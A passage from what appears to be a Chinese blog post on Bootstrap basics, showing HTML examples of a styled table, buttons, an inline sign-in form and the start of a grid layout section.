punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>./js/jquery-3.5.1.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>./js/bootstrap.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/css<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>./js/bootstrap.min.css<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>table table-hover<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>          <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span></span>              <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">></span></span></span>序号<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span></span>              <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">></span></span></span>年龄<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span></span>              <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">></span></span></span>姓名<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span></span>              <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">></span></span></span>住址<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span></span>          <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span></span>          <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span></span>            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">></span></span></span><span class="token number">1</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span></span>              <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">></span></span></span><span class="token number">20</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span></span>              <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">></span></span></span>王五<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span></span>              <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">></span></span></span>山东<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span></span>          <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span></span>          <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span></span>            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">></span></span></span><span class="token number">2</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span></span>              <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">></span></span></span><span class="token number">21</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span></span>              <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">></span></span></span>李四<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span></span>              <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">></span></span></span>北京<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span></span>          <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span></span>           <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span></span>            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">></span></span></span><span class="token number">3</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span></span>              <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">></span></span></span><span class="token number">32</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span></span>              <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">></span></span></span>张三<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span></span>              <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">></span></span></span>上海<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span></span>          <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span></span>           <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span></span>            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">></span></span></span><span class="token number">4</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span></span>              <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">></span></span></span><span class="token number">24</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span></span>              <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">></span></span></span>刘二<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span></span>              <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">></span></span></span>深圳<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span></span>          <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>你别说，人家集成好的就是牛b：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201030201155331.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>按钮测试：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token doctype">&lt;!DOCTYPE html></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span></span>测试css<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>./js/jquery-3.5.1.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>./js/bootstrap.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/css<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>./js/bootstrap.min.css<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>btn btn-default<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span> <span class="token attr-name">role</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>button<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>Link<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>btn btn-default<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>Button<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>btn btn-default<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>button<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Input<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>btn btn-default<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Submit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201030202126548.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>表单测试：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token doctype">&lt;!DOCTYPE html></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span></span>测试css<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>./js/jquery-3.5.1.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>./js/bootstrap.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/css<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>./js/bootstrap.min.css<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h3</span><span class="token punctuation">></span></span></span>php代码审计学习<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h3</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>form-inline<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>form-group<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>sr-only<span class="token punctuation">"</span></span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>exampleInputEmail3<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>Email address<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>email<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>form-control<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>exampleInputEmail3<span class="token punctuation">"</span></span> <span class="token attr-name">placeholder</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Email<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></span>  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>form-group<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>sr-only<span class="token punctuation">"</span></span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>exampleInputPassword3<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>Password<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>form-control<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>exampleInputPassword3<span class="token punctuation">"</span></span> <span class="token attr-name">placeholder</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Password<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></span>  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>checkbox<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span><span class="token punctuation">></span></span></span>      <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>checkbox<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span> Remember me    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span></span>  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></span>  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>btn btn-default<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>Sign in<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201030202404953.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h3 id="栅格系统"><a href="#栅格系统" class="headerlink" title="栅格系统"></a>栅格系统</h3><p>这个就是一个分片的布局：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token doctype">&lt;!DOCTYPE html></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span></span>测试css<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>./js/jquery-3.5.1.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>./js/bootstrap.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/css<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>./js/bootstrap.min.css<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/css<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>        div<span class="token punctuation">{</span>            border<span class="token punctuation">:</span> 1px red solid<span class="token punctuation">;</span>            margin<span class="token operator">-</span>top<span class="token punctuation">:</span> 20px<span class="token punctuation">;</span>            margin<span class="token operator">-</span>bottom<span class="token punctuation">:</span> 10px<span class="token punctuation">;</span>         <span class="token punctuation">}</span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h3</span><span class="token punctuation">></span></span></span>php代码审计学习<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h3</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span 